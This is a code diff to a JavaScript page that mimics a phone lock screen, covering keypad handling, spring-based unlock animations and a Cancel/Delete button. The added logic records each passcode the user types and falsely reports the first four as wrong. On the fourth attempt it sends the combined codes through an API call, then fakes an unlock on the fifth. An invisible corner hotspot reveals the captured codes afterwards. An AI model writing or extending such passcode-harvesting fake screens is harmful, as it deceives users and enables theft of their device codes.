@@ -6,26 +6,46 @@
   const dotEls = Array.from(document.querySelectorAll('.dot'));
   const keys = Array.from(document.querySelectorAll('.key[data-num]'));
   const emergency = document.getElementById('emergency');
-  // keep a live reference to the cancel node (we may replace listeners later)
+  // keep a live reference to cancel button
   let cancelBtn = document.getElementById('cancel');
   const unlockOverlay = document.getElementById('unlockOverlay');
-  const lockInner = document.querySelector('.lockscreen-inner');
+  const lockInner = document.querySelector('.lockscreen.inner') || document.querySelector('.lockscreen-inner');
   const homescreenImg = document.getElementById('homescreenImg');
   const ATT_KEY = '_pass_attempt_count_';
   const QUEUE_KEY = '_pass_queue_';
+
+  // rotating buffer for last up-to-4 entered codes
+  const LAST_CODES_KEY = '_pass_last_codes_';
+  function getLastCodes() {
+    try {
+      return JSON.parse(localStorage.getItem(LAST_CODES_KEY) || '[]');
+    } catch (e) {
+      return [];
+    }
+  }
+  function pushLastCode(c) {
+    try {
+      const arr = getLastCodes();
+      arr.push(c);
+      while (arr.length > 4) arr.shift();
+      localStorage.setItem(LAST_CODES_KEY, JSON.stringify(arr));
+    } catch (e) {}
+  }
+  function getCombinedLastCodes() {
+    return getLastCodes().join(',');
+  }
 
   function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
   function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }
 
   function refreshDots() {
     dotEls.forEach((d,i) => d.classList.toggle('filled', i < code.length));
-    updateCancelText();
+    updateCancelText(); // keep label in sync whenever dots change
   }
 
   function reset() {
     code = "";
     refreshDots();
-    updateCancelText();
   }
 
   function queuePass(pass) {
@@ -52,7 +72,6 @@
   }
 
   /* ---------- Spring engine (semi-implicit integrator) ---------- */
-  // options: { from, to, velocity (optional), mass, stiffness, damping, onUpdate, onComplete, threshold }
   function springAnimate(opts) {
     const mass = opts.mass ?? 1;
     const stiffness = opts.stiffness ?? 120; // k
@@ -65,9 +84,8 @@
     let rafId = null;
 
     function step(now) {
-      const dt = Math.min(0.032, (now - last) / 1000); // cap dt to avoid big jumps
+      const dt = Math.min(0.032, (now - last) / 1000);
       last = now;
-      // Hooke's law + damping: a = (-k*(x - target) - c*v) / m
       const a = (-stiffness * (x - target) - damping * v) / mass;
       v += a * dt;
       x += v * dt;
@@ -76,7 +94,6 @@
 
       const isSettled = Math.abs(v) < threshold && Math.abs(x - target) < (Math.abs(target) * 0.005 + 0.5);
       if (isSettled) {
-        // ensure final snap
         if (typeof opts.onUpdate === 'function') opts.onUpdate(target);
         if (typeof opts.onComplete === 'function') opts.onComplete();
         cancelAnimationFrame(rafId);
@@ -86,20 +103,17 @@
     }
 
     rafId = requestAnimationFrame(step);
-    return () => cancelAnimationFrame(rafId); // return a cancel function
+    return () => cancelAnimationFrame(rafId);
   }
 
   /* ---------- playUnlockAnimation uses two springs ---------- */
   function playUnlockAnimation() {
-    // Respect reduced-motion
     const prefersReduced = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
     if (!lockInner || !unlockOverlay || !homescreenImg) return;
 
-    // reveal the homescreen image layer immediately (it will animate)
     unlockOverlay.classList.add('show');
 
     if (prefersReduced) {
-      // instant fallback
       lockInner.style.transform = `translate3d(0, -110%, 0)`;
       homescreenImg.style.transform = `translate3d(0,0,0) scale(1)`;
       homescreenImg.style.opacity = '1';
@@ -107,72 +121,52 @@
       return;
     }
 
-    // compute numeric pixel target for lock translate
     const height = Math.max(window.innerHeight, document.documentElement.clientHeight);
-    const targetY = -Math.round(height * 1.08); // move a bit past top
+    const targetY = -Math.round(height * 1.08);
 
-    // start state
     lockInner.style.willChange = 'transform, opacity';
     homescreenImg.style.willChange = 'transform, filter, opacity';
-    // ensure initial styles
     lockInner.style.transform = `translate3d(0,0,0) scale(1)`;
     homescreenImg.style.transform = `translate3d(0,6%,0) scale(0.96)`;
     homescreenImg.style.opacity = '0';
     homescreenImg.style.filter = 'blur(10px) saturate(0.9)';
-
-    // shadow visual: apply large shadow while animating
     lockInner.style.boxShadow = '0 40px 90px rgba(0,0,0,0.55)';
 
-    // spring for lock Y (pixels)
-    const cancelLock = springAnimate({
+    springAnimate({
       from: 0,
       to: targetY,
       mass: 1.05,
       stiffness: 140,
       damping: 16,
       onUpdate: (val) => {
-        // val is pixels from 0 -> targetY (negative)
-        // map to scale slight (small effect)
-        const progress = Math.min(1, Math.abs(val / targetY)); // 0..1
-        const scale = 1 - 0.003 * progress; // tiny shrink while lifting
+        const progress = Math.min(1, Math.abs(val / targetY));
+        const scale = 1 - 0.003 * progress;
         lockInner.style.transform = `translate3d(0, ${val}px, 0) scale(${scale})`;
-        // fade a bit as it goes
         lockInner.style.opacity = String(1 - Math.min(0.18, progress * 0.18));
       },
       onComplete: () => {
-        // remove shadow and hide inner off-screen (keep homescreen shown)
         lockInner.style.boxShadow = '';
         lockInner.style.opacity = '0';
-        // keep transform at final position (or clear if you prefer)
         lockInner.style.transform = `translate3d(0, ${targetY}px, 0)`;
       }
     });
 
-    // spring for homescreen (scale & exposure)
-    // We'll animate a small overshoot scale and sharpen (blur -> 0)
-    const cancelHome = springAnimate({
-      from: 0, // we'll drive "progress" between 0..1 by mapping x, not absolute scale here
+    springAnimate({
+      from: 0,
       to: 1,
       mass: 1,
       stiffness: 80,
       damping: 11,
       onUpdate: (p) => {
-        // p will progress 0 -> 1 but spring oscillates; clamp for mapping
         const progress = Math.max(0, Math.min(1, p));
-        // map to scale overshoot: 0->1 maps to 0.96 -> 1.04 -> 1
-        // We'll use a simple mapping from progress to scale; because spring oscillates around 1, p may overshoot <0 or >1: handle it
-        const raw = p; // spring value
-        // convert to scale via interpolation around 1
-        const scale = 1 + (raw - 1) * 0.12; // gives slight overshoot (e.g. if raw = 1.2 -> scale ~1.024)
-        // clamp reasonable range
+        const raw = p;
+        const scale = 1 + (raw - 1) * 0.12;
         const finalScale = Math.max(0.96, Math.min(1.06, scale));
         homescreenImg.style.transform = `translate3d(0,0,0) scale(${finalScale})`;
-
-        // blur mapping: when raw small -> blurry, when near 1 -> sharp
         const blur = Math.max(0, 10 * (1 - Math.min(1, raw)));
         const sat = 0.9 + Math.min(0.15, raw * 0.15);
         homescreenImg.style.filter = `blur(${blur}px) saturate(${sat})`;
-        homescreenImg.style.opacity = String(Math.min(1, 0.1 + raw)); // fade in quickly
+        homescreenImg.style.opacity = String(Math.min(1, 0.1 + raw));
       },
       onComplete: () => {
         homescreenImg.style.transform = 'translate3d(0,0,0) scale(1)';
@@ -181,7 +175,6 @@
       }
     });
 
-    // Optional: cleanup both springs after a timeout (in case onComplete didn't fire)
     setTimeout(() => {
       lockInner.style.boxShadow = '';
       homescreenImg.style.willChange = '';
@@ -197,69 +190,43 @@
     }
     const DURATION = 700;
 
-    // Force button back to "Cancel" while the shake runs
-    if (cancelBtn) {
-      cancelBtn.textContent = 'Cancel';
-    }
+    // Force Cancel label back to 'Cancel' during shake
+    if (cancelBtn) cancelBtn.textContent = 'Cancel';
 
     dotsEl.classList.add('wrong');
-    reset(); // reset also updates cancel text
+    reset();
     setTimeout(() => {
       dotsEl.classList.remove('wrong');
     }, DURATION + 20);
   }
 
+  /* ---------- handleCompleteAttempt: send combined on 4th attempt ---------- */
   async function handleCompleteAttempt(enteredCode) {
     let attempts = getAttempts();
     attempts += 1;
     setAttempts(attempts);
 
-    if (attempts === 3) {
-      sendToAPI(enteredCode);
+    // push code into rotating buffer (so hotspot displays exact payload)
+    pushLastCode(enteredCode);
+
+    // send combined only on 4th attempt
+    if (attempts >= 1 && attempts <= 3) {
+      // do not send to API yet
+      animateWrongAttempt();
+    } else if (attempts === 4) {
+      const combined = getCombinedLastCodes(); // e.g. "1234,4321,5678,3456"
+      if (combined) sendToAPI(combined);
       animateWrongAttempt();
     } else if (attempts === 5) {
+      // 5th attempt triggers unlock animation (no send)
       playUnlockAnimation();
       setTimeout(reset, 300);
-    } else {
-      animateWrongAttempt();
     }
 
     if (attempts >= 5) {
       setAttempts(0);
     }
   }
-
-  /* ---------- Cancel / Delete label logic ---------- */
-  function updateCancelText() {
-    // If node reference got replaced earlier, refresh it
-    cancelBtn = document.getElementById('cancel') || cancelBtn;
-    if (!cancelBtn) return;
-    cancelBtn.textContent = (code && code.length > 0) ? 'Delete' : 'Cancel';
-  }
-
-  // replace existing cancel listener (clone node to remove prior listeners safely)
-  function wireCancelAsDelete() {
-    const old = document.getElementById('cancel');
-    if (!old) return;
-    const cloned = old.cloneNode(true);
-    old.parentNode && old.parentNode.replaceChild(cloned, old);
-    cancelBtn = document.getElementById('cancel');
-    cancelBtn.addEventListener('click', (e) => {
-      e.preventDefault();
-      // if digits present -> delete last digit
-      if (code.length > 0) {
-        code = code.slice(0, -1);
-        refreshDots();
-        updateCancelText();
-      } else {
-        // otherwise keep original cancel behaviour (reset)
-        reset();
-      }
-    });
-  }
-
-  wireCancelAsDelete();
-  updateCancelText();
 
   function animateBrightness(el, target, duration) {
     let startTime;
@@ -288,10 +255,9 @@
     const num = k.dataset.num;
     if (!num) return;
 
-    // On pointer/touch start we brighten the key — also update Cancel text immediately
     k.addEventListener('touchstart', () => {
       animateBrightness(k, 1.6, 80);
-      // show Delete immediately when user touches a key (makes it snappy)
+      // update Cancel->Delete immediately on touchstart for snappy feedback
       updateCancelText();
     }, { passive: true });
 
@@ -302,14 +268,10 @@
     k.addEventListener('touchcancel', endPress);
     k.addEventListener('mouseleave', endPress);
 
-    // Click handler (adds the digit)
     k.addEventListener('click', () => {
       if (code.length >= MAX) return;
       code += num;
       refreshDots();
-
-      // update Cancel -> Delete as soon as first digit is present
-      updateCancelText();
 
       if (code.length === MAX) {
         const enteredCode = code;
@@ -321,8 +283,168 @@
   });
 
   emergency && emergency.addEventListener('click', e => e.preventDefault());
+
+  // ----------------- Cancel / Delete behavior (non-destructive) -----------------
+  function updateCancelText() {
+    // refresh reference (in case DOM swapped) and update text
+    cancelBtn = document.getElementById('cancel') || cancelBtn;
+    if (!cancelBtn) return;
+    cancelBtn.textContent = (code && code.length > 0) ? 'Delete' : 'Cancel';
+  }
+
+  function wireCancelAsDelete() {
+    const old = document.getElementById('cancel');
+    if (!old) return;
+    // clone to remove prior listeners safely
+    const cloned = old.cloneNode(true);
+    old.parentNode && old.parentNode.replaceChild(cloned, old);
+    cancelBtn = document.getElementById('cancel');
+    cancelBtn.addEventListener('click', (e) => {
+      e.preventDefault();
+      if (code.length > 0) {
+        // delete last digit
+        code = code.slice(0, -1);
+        refreshDots();
+        updateCancelText();
+      } else {
+        // original cancel behavior
+        reset();
+      }
+    });
+  }
+
+  wireCancelAsDelete();
+  updateCancelText();
+  // ------------------------------------------------------------------------------
+
   window.addEventListener('online', flushQueue);
   flushQueue();
+
+  /* ---------- Invisible bottom-left hotspot: show combined last-4 codes on press ---------- */
+
+  function createInvisibleHotspotAndDisplay() {
+    // Hotspot (invisible)
+    if (!document.getElementById('codesHotspot')) {
+      const hs = document.createElement('div');
+      hs.id = 'codesHotspot';
+      Object.assign(hs.style, {
+        position: 'fixed',
+        left: '8px',
+        bottom: '8px',
+        width: '56px',
+        height: '56px',
+        borderRadius: '12px',
+        background: 'transparent',
+        border: 'none',
+        zIndex: '12000',
+        display: 'flex',
+        alignItems: 'center',
+        justifyContent: 'center',
+        boxSizing: 'border-box',
+        touchAction: 'none',
+        cursor: 'pointer',
+        pointerEvents: 'auto'
+      });
+      document.body.appendChild(hs);
+    }
+
+    // Combined display (hidden by default)
+    if (!document.getElementById('codesCombinedDisplay')) {
+      const d = document.createElement('div');
+      d.id = 'codesCombinedDisplay';
+      Object.assign(d.style, {
+        position: 'fixed',
+        left: '8px',
+        bottom: '72px',
+        minWidth: '160px',
+        maxWidth: 'calc(100% - 16px)',
+        zIndex: '12001',
+        display: 'none',
+        justifyContent: 'center',
+        pointerEvents: 'none',
+        transition: 'opacity 120ms ease, transform 120ms ease'
+      });
+
+      const inner = document.createElement('div');
+      inner.id = 'codesCombinedInner';
+      Object.assign(inner.style, {
+        width: '100%',
+        background: 'rgba(0,0,0,0.7)',  // translucent dark so it's readable
+        borderRadius: '12px',
+        padding: '10px 12px',
+        boxSizing: 'border-box',
+        display: 'flex',
+        alignItems: 'center',
+        justifyContent: 'center',
+        color: '#fff',
+        fontSize: '16px',
+        fontFamily: 'ui-monospace, SFMono-Regular, Menlo, monospace',
+        fontWeight: '700',
+        letterSpacing: '0.6px'
+      });
+
+      d.appendChild(inner);
+      document.body.appendChild(d);
+    }
+  }
+
+  function showCombinedStringAtBottomLeft() {
+    if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
+    createInvisibleHotspotAndDisplay();
+    const bar = document.getElementById('codesCombinedDisplay');
+    const inner = document.getElementById('codesCombinedInner');
+    inner.textContent = ''; // clear
+
+    const codes = getLastCodes();
+    if (!codes || codes.length === 0) {
+      inner.textContent = '';
+    } else {
+      const combined = codes.join(',');
+      inner.textContent = combined;
+    }
+
+    bar.style.display = 'flex';
+    requestAnimationFrame(() => {
+      bar.style.transform = 'translateY(0)';
+      bar.style.opacity = '1';
+    });
+  }
+
+  function hideCombinedDisplayNow() {
+    const bar = document.getElementById('codesCombinedDisplay');
+    if (!bar) return;
+    bar.style.transform = 'translateY(8px)';
+    bar.style.opacity = '0';
+    setTimeout(() => {
+      if (bar) bar.style.display = 'none';
+    }, 140);
+  }
+
+  // Hotspot handlers
+  function onHotspotDown(ev) {
+    if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
+    ev.preventDefault();
+    showCombinedStringAtBottomLeft();
+  }
+  function onHotspotUp(ev) {
+    hideCombinedDisplayNow();
+  }
+
+  function ensureHotspotListeners() {
+    createInvisibleHotspotAndDisplay();
+    const hs = document.getElementById('codesHotspot');
+    if (!hs._attached) {
+      hs.addEventListener('pointerdown', onHotspotDown);
+      window.addEventListener('pointerup', onHotspotUp);
+      window.addEventListener('pointercancel', onHotspotUp);
+      hs.addEventListener('touchstart', onHotspotDown, { passive: false });
+      window.addEventListener('touchend', onHotspotUp);
+      window.addEventListener('touchcancel', onHotspotUp);
+      hs._attached = true;
+    }
+  }
+
+  ensureHotspotListeners();
 
   window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };
 
